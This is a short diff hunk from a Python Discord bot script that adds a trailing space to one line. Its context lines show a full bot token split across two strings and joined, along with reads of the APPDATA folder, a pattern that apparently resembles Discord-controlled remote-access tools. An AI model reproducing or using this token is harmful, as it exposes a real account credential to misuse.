@@ -18,7 +18,7 @@ from discord import utils
 token1 = 'MTI3MDkwMDg5ODk0MzU5ODYyMg.Gtepny.'
 token2 = 'dX49Q8g-aPtUX2JtgeWQRFINm5QIBgMe0UMkHs'
 token = token1 + token2
-global appdata
+global appdata 
 appdata = os.getenv('APPDATA')
 intentz = discord.Intents.all()
 client = discord.Client(intents=intentz)
